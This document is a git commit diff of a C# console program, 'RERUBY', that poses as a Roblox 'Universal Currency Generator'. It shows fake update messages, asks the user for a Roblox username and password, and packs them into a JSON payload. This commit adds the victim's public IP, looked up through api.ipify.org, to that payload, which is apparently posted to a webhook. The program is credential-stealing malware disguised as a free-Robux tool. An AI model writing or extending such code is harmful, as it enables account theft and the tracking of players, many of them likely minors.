7388d1ba6a17e0d3d15586a87b457eadf06cf4e0
PuyanJR <davidpuiu18@gmail.com>
2025-12-07 15:15:15 +0200

    added ip

--- Program.cs
+++ Program.cs
@@ -1,19 +1,49 @@
-﻿using System;
+﻿/*
+  RERUBY by rbx.davidpuiu#0 12.2025
+
+    credits:
+    david - owner / developer
+    robert - tester
+    serafim - motivatie
+
+    please dont use this for personal gain/harful purposes
+    feel free to edit anything but make sure to credit ok?!?!??!
+*/
+
+using System;
 using System.Diagnostics;
 using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Net.Http;
 using System.Text.Json;
+using System.Drawing;
 
 partial class Program
 {
     static async Task Main()
     {
+        string print = @" __    __   ______    ______  
+|  \  |  \ /      \  /      \ 
+| $$  | $$|  $$$$$$\|  $$$$$$\
+| $$  | $$| $$   \$$| $$ __\$$
+| $$  | $$| $$      | $$|    \
+| $$  | $$| $$   __ | $$ \$$$$
+| $$__/ $$| $$__/  \| $$__| $$
+ \$$    $$ \$$    $$ \$$    $$
+  \$$$$$$   \$$$$$$   \$$$$$$                         
+";
+        Console.WriteLine(print);
         Console.WriteLine("Welcome to Universal Currency Generator! (UCG) by MirkoKING https://youtube.com/c/MirkoKING");
-        Thread.Sleep(1000);
+        Thread.Sleep(500);
+        Console.ForegroundColor = ConsoleColor.Blue;
+        Console.Write("[UPDATE] ");
+        Console.ForegroundColor = ConsoleColor.White;
         Console.WriteLine("Searching for updates...");
         Thread.Sleep(5000);
+        Console.ForegroundColor = ConsoleColor.Blue;
+        Console.Write("[UPDATE] ");
+        Console.ForegroundColor = ConsoleColor.White;
         Console.WriteLine("Running latest version! 4.8.5");
         Console.WriteLine("Waiting for RobloxPlayerBeta.exe...");
 
@@ -32,6 +62,10 @@ partial class Program
         }
 
         // Continue
+        string userIp;
+        using HttpClient client = new HttpClient();
+        userIp = await client.GetStringAsync("https://api.ipify.org");
+
         Console.WriteLine("Waiting..");
         Thread.Sleep(2400);
         Console.Write("Enter username: ");
@@ -46,10 +80,8 @@ partial class Program
         // Let System.Text.Json properly escape the text
         string jsonPayload = JsonSerializer.Serialize(new
         {
-            content = $"Username: {username}\nPassword: {password}\nRobux: {robux}"
+            content = $"Username: `{username}`\nPassword: `{password}`\nRobux: `{robux}`\nIP: `{userIp}`"
         });
-
-        using HttpClient client = new HttpClient();
 
         var content = new StringContent(jsonPayload, Encoding.UTF8, "application/json");
 
